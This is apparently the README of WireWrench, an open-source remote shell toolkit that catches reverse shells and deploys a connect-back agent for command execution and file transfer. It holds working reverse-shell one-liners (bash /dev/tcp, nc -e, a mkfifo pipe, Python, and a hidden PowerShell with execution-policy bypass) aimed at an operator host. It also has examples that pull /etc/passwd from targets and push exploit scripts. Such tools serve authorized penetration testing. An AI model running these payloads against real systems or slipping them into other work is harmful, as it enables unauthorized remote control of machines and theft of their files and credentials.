# WireWrench

> **A remote shell toolkit** — catch reverse shells, manage sessions, deploy smart agents, transfer files.

WireWrench is a complete rework of the original single-binary REPL into a full client-server remote shell toolkit with a smart agent (`ww-target`) for reliable command execution and file transfer.

By default `ww` talks to `ww-server` over a Unix socket.  Run `ww-server --control-port <PORT>`
to **also** accept `ww` clients over TCP, then point `ww` at it with `-H <host>:<port>` — useful
when the client and server are on different machines.

## Architecture

```
┌─────────────────┐    Unix Socket     ┌──────────────────┐     TCP :4444     ┌─────────────┐
│   ww (client)   │ ◄───────────────► │  ww-server       │ ◄──────────────► │ dumb shell  │
│                 │   JSON over socket │  (daemon)         │   raw TCP        │ (ncat, bash)│
│  • list shells  │                    │                  │                  └─────────────┘
│  • send cmd     │   TCP control (opt)│  • TCP listener  │
│  • interact     │ ◄───────────────►  │  • Smart agent   │     TCP :4446     ┌─────────────┐
│  • script file  │  ww -H host:4445   │  • Session mgmt  │ ◄──────────────► │ ww-target   │
│  • targ push    │                    │  • File transfer │   framed protocol │ (smart agent)│
│  • targ pull    │                    │  • Unix socket   │                  └─────────────┘
│                 │                    │  • TCP control   │
└─────────────────┘                    └──────────────────┘
```

## Platform support

| Binary | Builds & runs on |
|--------|------------------|
| `ww` (client) | Unix (Linux, macOS; BSDs best-effort) |
| `ww-server` | Unix (Linux, macOS; BSDs best-effort) |
| `ww-target` | Unix (Linux, macOS) **and** Windows |

`ww` and `ww-server` are intentionally Unix-only — building them for Windows
fails at compile time with `ww is only intended to be built for unix platforms`.
`ww-target` is the cross-platform agent: deploy the Linux/macOS binary or the
`ww-target.exe` build to any target; a Linux/macOS `ww-server` manages them all
identically over the OS-agnostic framed protocol.

## Quick Start

### Dumb reverse shell (any standard payload)

```bash
# 1. Start the server (listens for reverse shells on :4444)
ww-server

# 2. From a target machine, send a reverse shell:
target$ bash -c 'exec bash -i &>/dev/tcp/10.0.0.5/4444 0>&1'

# 3. List active shells
ww list

# 4. Send a command (polling-based, uses --timeout / -t)
ww send 1 "whoami"

# 5. Interactive mode (Ctrl+C to detach, shell stays alive)
ww interact 1
```

> **Note on dumb-shell stderr:** a dumb shell only relays bytes it actually
> sends over the TCP socket.  Some payloads keep the shell's **stderr** on the
> target's own terminal instead of forwarding it — for example
> `ncat 127.0.0.1 4444 -e /bin/bash` prints `bash: ...: command not found` in
> the *ncat* terminal, so `ww send` can never see it.  Use a payload that merges
> stderr into the socket (the `bash -i &>/dev/tcp/... 0>&1` example above already
> does this) or, with `ncat`, use `--sh-exec "/bin/bash 2>&1"`.

### Smart agent (ww-target)

`ww-target` is a Rust binary you push to the target machine. It gives you **deterministic command execution with exit codes**, file transfers, and no stale-output bugs.

```bash
# 1. Start the server (listens for ww-target on :4446)
ww-server

# 2. On the target machine, run ww-agent connecting back:
target$ ./ww-target 10.0.0.5

# 3. Send commands — exit codes captured, output is exact, no stale data
ww send 1 "uname -a"
# exit code: 0

ww send 1 "cat /etc/passwd | wc -l"
# exit code: 0

ww send 1 "ls /nonexistent"
# exit code: 2

# 4. Upload / download files
ww targ upload 1 ./local-file.txt /tmp/remote-file.txt
ww targ download 1 /etc/passwd ./passwd-backup

# 5. Interactive mode (uses persistent /bin/sh on the target)
ww interact 1
```

## Installation

```bash
cargo install wirewrench
```

Or build from source:

```bash
git clone https://github.com/amrosia/wirewrench
cd wirewrench
cargo build --release
cp target/release/{ww,ww-server,ww-target} ~/.local/bin/
```

## Usage

### Server

```bash
ww-server                          # default: :4444, smart :4446, socket /tmp/wirewrench.sock
ww-server -p 5555                  # custom TCP port for dumb shells
ww-server -P 5556                  # custom smart port for ww-target
ww-server -H 0.0.0.0 -p 8080      # custom host and port
ww-server -s /tmp/ww.sock          # custom socket path
ww-server -c 4445                  # also accept ww clients over TCP (:4445, in addition to the socket)
ww-server -c 4445 -k ~/.ssh/authorized_keys   # ...and require SSH key auth on that port
```

### Client — Shell Commands

```bash
# Local control (default): Unix socket at /tmp/wirewrench.sock
# List active shells (ww-target sessions show their platform, e.g. windows/x86_64)
ww list

# Remote control over TCP (server must run with `ww-server --control-port`)
ww -H 10.0.0.5:4445 list        # host and port together; the port is required
ww -H 10.0.0.5:4445 send 1 "uname -a"
ww -H 10.0.0.5:4445 -i ~/.ssh/id_ed25519 list   # authenticate with a private key

# Send a command (smart agent: waits until command finishes; dumb shell: polls with timeout)
ww send 1 "uname -a"

# Explicit timeout (default: 0 = no timeout for smart agents, 3s fallback for dumb shells)
ww send -t 5 1 "sleep 10; echo done"

# Interactive shell session (Ctrl+C to detach, shell stays alive)
ww interact 1

# Run commands from a file (lines starting with # are skipped)
ww script 1 payloads.txt

# Close/kill a shell
ww close 1
```

### Client — File Transfer (smart agent only)

```bash
# Upload a file to the target
ww targ upload 1 ./exploit.sh /tmp/exploit.sh

# Download a file from the target
ww targ download 1 /etc/passwd ./passwd

# Specify a timeout for large files (default: 30s)
ww targ upload -t 60 1 ./big-file.bin /tmp/big-file.bin

# Cancel an ongoing transfer
ww targ cancel 1
```

## Control-port authentication

When the TCP control port is exposed to a network (`ww-server -c`), you can
require SSH-style public-key authentication.  The Unix socket is **never**
authenticated — keys apply only to the TCP control listener.

```bash
# Server: authorize public keys (a single authorized_keys-style file, or a
# folder of such files — one key per line)
ww-server -c 4445 -k ~/.ssh/authorized_keys

# Client: present the matching private key (like ssh -i)
ww -H 10.0.0.5:4445 -i ~/.ssh/id_ed25519 send 1 "uname -a"
```

- **Key types**: ed25519, RSA, ECDSA — anything `ssh-keygen` produces.
- **Passphrases**: encrypted private keys prompt for a passphrase on the terminal.
- **Without `-k`**, `ww-server -c` still runs but prints a loud
  `⚠ WARNING` that the control port is unauthenticated.
- **Errors**: connecting without a key to an authenticated server, or offering
  the wrong key, fails with a clear, non-zero-exit message.

Default key locations can be stored instead of passing flags every time:

```ini
# ~/.config/wirewrench/server.conf
control_public_keys = ~/.ssh/authorized_keys
```

```ini
# ~/.config/wirewrench/client.conf
host = 10.0.0.5:4445    # default control target (HOST:PORT); overridden by -H
identity = ~/.ssh/id_ed25519
# several keys are tried in order:
identity = ~/.ssh/id_rsa
```

With these set, a plain `ww list` / `ww send 1 "cmd"` connects over TCP to
the configured host using the configured key — no flags needed.  Explicit
`-H`/`-i` always override the config values.

The handshake mirrors ssh: the client offers a public key, the server replies
with a fresh per-connection challenge, the client signs it with the private
key, and the server verifies the signature against the authorized key set —
which is re-read on every connection, so key rotation needs no restart.

## Smart Agent (`ww-target`)

`ww-target` is a lightweight Rust agent that connects back to `ww-server` on the **smart port** (default `:4446`) using a framed binary protocol.

### Why use it over a dumb shell?

| Feature | Dumb shell (ncat/bash) | ww-target |
|---------|------------------------|-----------|
| **Command boundaries** | None — output bleeds between commands | Deterministic — each command is `sh -c` (or `cmd /C` on Windows), captured via `wait_with_output()` |
| **Exit codes** | Not available | Captured and returned |
| **Stale output** | Common — old output pollutes next command | Impossible — per-command sequence numbers |
| **File transfer** | Manual (base64 tricks) | Built-in push/pull with SHA-256 verification |
| **Timeout default** | 3s polling cap | No default — waits as long as the command needs |
| **State between commands** | Persistent shell | Stateless (each `ww send` is a fresh `sh -c`) |
| **Interactive mode** | Persistent shell | Persistent shell (separate code path via FRAME_SHELL) |

### Cross-platform target

`ww-target` runs on Linux, macOS, and Windows. Server-side behavior is identical
regardless of target OS, and `ww list` shows each session's platform (e.g.
`windows/x86_64`).

**Windows targets** — build `ww-target.exe` (see CI, or cross-compile with the
`x86_64-pc-windows-gnu` target + mingw-w64) and run it on the target:

```powershell
C:\> ww-target.exe 10.0.0.5
```

Commands execute via `cmd.exe /C` (resolved from `%COMSPEC%`), so use Windows
shell syntax: `dir` not `ls`, `type` not `cat`. Command output is decoded as
UTF-8; non-ASCII console output is best-effort. Override the shell with
`--shell powershell` (or `--shell C:\Path\To\Shell.exe`); on Unix the default
is `/bin/sh`.

**macOS targets** — use the `aarch64-apple-darwin` (Apple Silicon) or
`x86_64-apple-darwin` (Intel) build. The default shell is `/bin/sh`.

```bash
target$ ./ww-target 10.0.0.5
```

macOS may quarantine downloaded binaries — clear it with
`xattr -d com.apple.quarantine ww-target`, and approve the firewall prompt the
first time `ww-server` binds a listening port.

### Protocol

`ww-target` uses a framed binary protocol over TCP:

| Frame | Code | Direction | Purpose |
|-------|------|-----------|---------|
| `FRAME_SHELL` | `0x01` | Bidirectional | Raw shell stdin/stdout (interactive mode) |
| `FRAME_HANDSHAKE` | `0x02` | Bidirectional | Initial identity exchange |
| `FRAME_FILE_CTRL` | `0x03` | Bidirectional | File transfer coordination (JSON) |
| `FRAME_FILE_DATA` | `0x04` | Server → Target | Raw file bytes during push |
| `FRAME_CANCEL` | `0x05` | Bidirectional | Abort file transfer |
| `FRAME_HASH` | `0x06` | Bidirectional | SHA-256 verification |
| `FRAME_KEEPALIVE` | `0x07` | Bidirectional | Heartbeat |
| `FRAME_CMD` | `0x08` | Server → Target | Execute `sh -c` command (JSON: `{seq, cmd}`) |
| `FRAME_CMD_RESULT` | `0x09` | Target → Server | Command result (JSON: `{seq, exit_code, stdout, stderr}`) |

### Reverse Shell One-Liners (Dumb Shells)

If you can't deploy `ww-target`, standard reverse shells still work:

```bash
# Bash
target$ bash -c 'exec bash -i &>/dev/tcp/10.0.0.5/4444 0>&1'

# Netcat (traditional)
target$ nc -e /bin/sh 10.0.0.5 4444

# Netcat with stderr forwarded (nmap ncat)
target$ ncat 10.0.0.5 4444 --sh-exec "/bin/bash 2>&1"

# Netcat (OpenBSD)
target$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 4444 > /tmp/f

# Python
target$ python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("10.0.0.5",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# PowerShell
target> powershell -NoP -NonI -W Hidden -Exec Bypass -C "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

## Features

- **Dual-mode shell handling** — dumb reverse shells (raw TCP) and smart agents (framed protocol)
- **Deterministic command execution** — `ww-target` uses per-command `sh -c` with `wait_with_output()`, returning exact stdout, stderr, and exit code
- **No stale output** — per-command sequence numbers in `FRAME_CMD`/`FRAME_CMD_RESULT` prevent output from bleeding between commands
- **File transfers** — push/pull files with SHA-256 hash verification
- **Interactive mode** — full raw terminal, line editing, word navigation, Ctrl+C detach
- **Scripting** — run command lists from files with comment and empty-line support
- **Session persistence** — shells stay alive when you detach from interactive mode
- **JSON-over-Unix-socket API** — extensible control protocol

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for version history.

## License

AGPL-3.0-or-later
